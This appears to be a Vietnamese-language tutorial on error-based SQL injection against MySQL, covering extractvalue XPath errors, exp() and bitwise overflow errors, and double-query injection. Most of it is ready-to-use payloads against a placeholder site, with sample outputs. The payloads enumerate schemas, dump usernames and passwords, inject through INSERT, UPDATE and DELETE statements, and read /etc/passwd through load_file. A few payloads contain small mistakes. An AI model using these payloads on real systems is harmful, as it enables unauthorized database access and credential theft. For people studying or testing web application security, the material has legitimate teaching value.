- Error Based Sql injection Đây là phương thức xuất thông tin từ 1 database khi mà các hàm function như Union Select không working

# Error Based Injection using Extractvalue

1.Khi nào có thể sử dụng Xpath Error based
`The Used Select Statements Have  Different Number Of Columns`

-Hàm đầu vào:
	`Extract Value('xmldatahere','xpathqueryhere')
Nếu XPath query là không chính xác, ta sẽ nhận đưọc thông báo lỗi
	`XPATH syntax error: 'xpathqueryhere'`

-Khi mà chúng ta sử dụng phương thức Union based injections mà không thấy kết quả, chuyển qua sử dụng Error Based Injection

-Giả sử chúng ta đã tìm ra đưọc 5 cột bằng:
`www.vuln-web.com/index.php?view=-35" union select 1,2,3,4,5--`

-Bây giờ chuỗi truy vấn ta có ý nghĩa như thế này:
`select path from pages where view="<our_input_here>" limit 1,1;`

-Do đó chúng ta tiếp tục với việc tiêm của chúng ta khi dùng XPATH injection
`www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(OUR QUERY HERE)))--`

-Lấy Database
```sh
www.vuln-web.com/index.php?view=-35" extractvalue(0x0a,concat(0x0a,(select database())))--

Output : XPATH syntax error: ' database_name_here'
```
Khi có được Database ta tiếp tục

-Lấy tables trong Database
```sh
www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--

Output : XPATH syntax error: 'table_name_here'
```
Ta dùng `limit` khi chúng ta không thể trích xuất các dữ liệu dài có giới hạn tối đa 32 kí tự. Do đó ta sẽ tăng row lên từ từ để có được dữ liệu đầu ra.

Và giả sử ta đã nhận được các bảng sau khi dùng Query:

```sh 
    Posts
    Assets
    Banner
    Links
    Users
``` 

Tiếp tục Lấy các columns:

```sh
www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where tables_schema=database() and table_name='users' limit 0,1)))---

Output : XPATH syntax error: 'column_name_here'
```
Gia sử ta lấy được 3 cột
```sh
id
username
password
```

Trước khi lấy dữ liệu, ta tiến hành đếm số cột

```sh
www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))---

Output : XPATH syntax error: 'count_will_come_here'
```
Tuong tự bạn có thể đếm số bảng hoặc số cột. Tiếp tục lấy dữ liệu

```sh
www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))---

Output : XPATH syntax error: 'Output_here'
```


----------------------------------------------------------------------------------------------------------------------------------------------

# Error Based SQL Injection Using EXP
-Khai thác lỗi bằng cách lợi dụng việc xử lí tràn số trong MySQL.

-Lợi dụng xử lý out-of-range và overflow trên các phiên bản MySQL từ 5.5.5 trở lên, ta có thể gây ra tràn số để leak dữ liệu qua các thông báo lỗi, qua đó thực hiện khai thác Error based SQL injection.

## Cách thực hiện

###  1. Xử lý Out-of-range và Overflow trong MySQL

-Ta sử dụng hàm exp() với giá trị lớn vượt quá 709 
```sh	
	mysql> select exp(710);
	ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```
-exp là chức năng nghịch đảo của hàm ln và log trong MySQL. 

### 2.Thực hiện làm tràn dữ liệu và trích xuất dữ liệu
-Khi nói đến khai thác, ta có thể gây ra các lỗi "Giá trị Double bị vượt khỏi phạm vi" bằng cách phủ nhận các truy vấn. Giả sử Ta thực hiện một truy vấn phủ định bitwise, nó sẽ trả lại "18446744073709551615". Đây là sự phủ định của bit 0.  -0 và nó sẽ trả về giá trị lớn nhất kiểu BIGINT là 18446744073709551615. 

-Ta thực hiện các phép toán gây tràn số, MySQL sẽ rò rỉ các thông tin về cơ sở dữ liệu

```sh
mysql> select exp(~(select * from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
```

```sh
mysql> select ! (select * from (select user())x) - ~0 - ~0;
ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'
```
-Trích xuất dữ liệu
   +Thu thập thông tin về bảng
  `select !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0-~0)`

  `select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));`

   +Thu thập thông tin về cột
  `select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0-~0;`
  
  `select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));`

   +Trích xuất dữ liệu 
   `select !(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;`

   `select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));`

  - Dump cơ sở dữ liệu trong một câu truy vấn
  ```sh
  !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0-~0

  (select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)

  (select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)

  exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
  ```
  ### 3. Injection vào các câu truy vấn

-Insert
`mysql> insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre');
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'`

`mysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'`

-Update
`mysql> update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'`

`mysql> update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'`

-Delete
`mysql> delete from users where id='1' or !(select*from(select user())x)-~0 or '';
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'`

`mysql> delete from users where id='1' | exp(~(select*from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'`

## 4.Đọc file
`select exp(~(select*from(select load_file('/etc/passwd'))a));`

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Error Based Injection SubQuery Injection
-XPATH đối với một số phiên bản MySQL bị loại bỏ bởi admin. Và để giải quyết vấn đề đó ta sẽ dùng Sub Query Injection.
```sh
www.vuln-web.com/photo.php?id=1/
No Error

www.vuln-web.com/photo.php?id=1"
No Error

www.vuln-web.com/photo.php?id=1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```
Chúng ta có thể nhìn thấy lỗi là
`"1" LIMIT 0,1'`

Và `'1" LIMIT 0,1` là một phần của truy vấn. Bây giờ ta có thể thấy đầu vào của cúng ta đó là 1' đã tạo ra lỗi bởi vì chúng ta đã nhập một câu lệnh duy nhất và  ứng dụng web cũng được thêm một câu lệnh đơn bởi chủ của nó. Thể nên ta cần phải ngăn chặn lỗi đó xảy ra. Đầu tiên chúng ta có thể tưởng tượng đưọc truy vấn có thể làm được gì:

Giả định truy vấn theo lỗi
`select field1,field2 from table1 where id='<our_input_here>' LIMIT 0,1;`

Tiếp tục thử với các kí tự khác
```sh
www.vuln-web.com/photo.php?id=1'--
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

www.vuln-web.com/photo.php?id=1'#
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

www.vuln-web.com/photo.php?id=1'/*
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/*' LIMIT 0,1' at line 1

www.vuln-web.com/photo.php?id=1'-- -
No Error
```
Ta tiếp tục dùng chức năng AND để biết

Giả sử truy vấn dựa theo lỗi đó:
`select field1,field2 from table1 where id='1' and true-- -' LIMIT 0,1;`

Ta đã tiêm 1' and true-- - do đó bất cứ gì đằng sau -- - không thuộc trong truy vấn, do đó truy vấn thực sự của chúng ta là:
`select field1,field2 from table1 where id='1' and true;`

Ở đây cả hai trường hợp đều đúng do đó bạn sẽ get được trang bình thường như nó đưọc trả lại trước đó khi bắt đầu. Bây giờ ta sẽ inject false và thử nếu nó nhận được bất cứ lỗi nào.
`select field1,field2 from table1 where id='11 and false`

Lúc này trang sẽ không tải được như bình thường. NÓ không thông qua bất cứ lỗi nào nhưng khi bạn không thấy trang khi bình thưòng được tải trước đó  với true. Điều đó có nghĩa là injection đang hoạt động
```sh
www.vuln-web.com/photo.php?id=1' and true-- -
Normal Page

www.vuln-web.com/photo.php?id=1' and false-- -
Page din't Load As normally it do as the query dint returned anything.
```

Bây giờ bắt đầu tìm số cột

```sh
www.vuln-web.com/photo.php?id=1' order by 1-- -
No Error

www.vuln-web.com/photo.php?id=1' order by 1,2-- -
No Error

www.vuln-web.com/photo.php?id=1' order by 1,2,3-- -
No Error

www.vuln-web.com/photo.php?id=1' order by 1,2,3,4-- -
Error : Unknown column '4' in 'order clause'
```
Tức là cột cuối cùng là cột sẽ không có lỗi. Do đó ta có 3 cột. Đầu tiên thử dùng Union Based Injection
`www.vuln-web.com/photo.php?id=-1' union select 1,2,3-- -`

Nhớ làm mất hiệu lực đầu vào đầu tiên như khi gán -1, Bạn có thể sử dụng cách khác như thảo luận trước đó để làm mất hiệu lực truy đầu tiên vì đó nó không thể nhận bất kì đầu ra và đầu ra các injection của chúng ta khi ta printed. Với trường hợp này bạn có thể dùng XPATH Injection using UpdateXML hoặc XPATH Injection using ExtractValue nhưng đối vơi một số version của SQL sẽ vô hiệu hóa các chức năng đó. Những lúc này ta sẽ dùng Sub Query hoặc còn gọi là Double Queru injection
```sh
www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((<Your Query here to return single row>),0x3a,floor(rand (0) *2))y from information_schema.tables group by y) x)-- -
```

Ta sẽ được một đầu ra có dạng lỗi như sau:
`Duplicate entry '<Your Output here>:1' for key 'group_key'`

Ta có thể bắt đầu thực hiện truy vấn vào Database và sau đó là tables, columns và cuối cùng là lấy dữ liệu

Truy cập Database:
```sh
www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
```

Truy cập Tables:
```sh
www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
```

Truy cập các cột của mỗi tables
```sh
www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='<table_name_here>' limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
```
Truy cập vào dữ liệu của cột
```sh
www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select concat(<column_1>,<column_2>) from <table_name_here> limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
```


